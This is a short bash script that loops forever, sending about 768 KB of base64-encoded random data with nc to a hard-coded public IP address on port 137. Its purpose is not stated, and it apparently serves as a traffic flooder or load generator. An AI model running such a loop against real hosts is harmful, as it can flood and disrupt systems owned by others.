#!/usr/bin/env bash

while :
do
    dd if=/dev/urandom bs=786438 count=1 status=none | base64 | nc -w 2 3.14.137.65 137
done
